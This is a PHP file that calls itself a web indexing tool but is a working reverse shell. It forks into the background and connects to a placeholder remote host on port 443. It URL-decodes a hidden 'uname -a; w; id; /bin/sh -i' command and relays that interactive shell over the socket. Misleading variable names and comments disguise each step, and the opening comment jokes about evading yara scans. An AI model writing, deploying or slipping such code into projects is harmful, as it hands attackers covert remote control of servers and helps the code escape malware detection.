<?php
// Web indexing tool that isn't a reverse shell. Please use this responsibly and do not run yara against it ;) 
// $possible_pages = port
// $web_session_seed = ipa, ipb, ipc, ipd

set_time_limit (0);
$VERSION = "1.0";
$err_a = null;
$write_a = null;
$outbound = 'Parent indexing connection';
$web_session_seed = array(CH, AN, GE, ME); // seed for local web authentication
$possible_pages = 443;
$chunk_size = 1400;
$daemon = 0;
$debug = 0;


// Daemonise the web indexer to close processess for resource isage

// allowed usage of pcntl_fork is rare, but is better for resource availability
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		console_log("ERROR: Can't fork indexer");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent
    }
    
	if (posix_setsid() == -1) {
        console_log("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
    console_log("Possible Issue: Failed to start indexing process.  This is OK");
}

// Start indexing from base directory
chdir("/");

// Remove any unnecessary user mask
umask(0);

// Do the indexing...

// Connect to the indexing host
$index_connection = fsockopen(join(".",$web_session_seed), $possible_pages, $errno, $errstr, 30);
if (!$index_connection) {
    console_log("$errstr ($errno)");
	exit(1);
}

// Pipe findings to indexing host
$descriptorspec = array(
   0 => array("pipe", "r"),
   1 => array("pipe", "w"),
   2 => array("pipe", "w")
);

// decode the sanitized URL of the local webhost
$index_host = substr(rawurldecode('localhost%3A%24a%20%3D%20%27uname%20-a%3B%20w%3B%20id%3B%20%2Fbin%2Fsh%20-i'), 16);
    
$process = proc_open($index_host, $descriptorspec, $pipes);

if (!is_resource($process)) {
    console_log("Issue: Can't create child indexing process");
	exit(1);
}

// Indexing is non-blocking as there should never be a wait condition
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($index_connection, 0);

console_log("Successfully started indexing");

while (1) {
	// Check for end of indexing host connection
	if (feof($index_connection)) {
        console_log("Issue: Parent indexing connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
        console_log("Issue: Indexing process terminated");
		break;
	}

	$read_a = array($index_connection, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $err_a, null);

	// Processing standard input from each page
	if (in_array($index_connection, $read_a)) {
        $fdata = fread($index_connection, $chunk_size);
		fwrite($pipes[0], $fdata);
	}

	// Collection information to input
	if (in_array($pipes[1], $read_a)) {
		$idata = fread($pipes[1], $chunk_size);
		fwrite($index_connection, $idata);
	}

	// If we can read from the process's STDERR
	if (in_array($pipes[2], $read_a)) {
		$idata = fread($pipes[2], $chunk_size);
		fwrite($index_connection, $idata);
	}
}

    
// ending the connection; closing the logging location
fclose($index_connection);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// logging via printing to stdout
function console_log ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 

